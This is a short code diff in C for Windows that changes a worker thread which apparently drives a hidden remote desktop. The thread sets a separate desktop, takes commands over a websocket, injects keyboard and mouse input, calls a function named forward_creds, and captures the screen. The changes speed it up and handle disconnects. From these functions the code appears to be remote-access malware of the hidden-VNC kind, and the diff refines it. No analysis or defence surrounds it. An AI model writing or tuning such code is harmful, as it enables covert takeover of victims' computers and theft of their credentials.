@@ -258,16 +258,19 @@ static DWORD WINAPI worker(LPVOID arg) {
     (void)arg;
     SetThreadDesktop(g_hdesk);
     lg("worker start");
-    char inbuf[4096];
+    char inbuf[8192];
     int logged = 0;
+    int closed = 0;
     for (;;) {
-        if (ws_wait(&g_ws, 0) == 1) {
+        for (int k = 0; k < 128; k++) {
+            if (ws_wait(&g_ws, 0) != 1) break;
             int op = 0;
             long n = ws_recv(&g_ws, inbuf, sizeof(inbuf) - 1, &op);
-            if (n <= 0) break;
+            if (n <= 0) { closed = 1; break; }
             inbuf[n] = 0;
             if (op == 1) inject_input(inbuf);
         }
+        if (closed) break;
         forward_creds();
 
         unsigned char *rgb = capture_rgb();
@@ -288,7 +291,7 @@ static DWORD WINAPI worker(LPVOID arg) {
             }
             free(mb.data);
         }
-        Sleep(125);
+        Sleep(80);
     }
     return 0;
 }
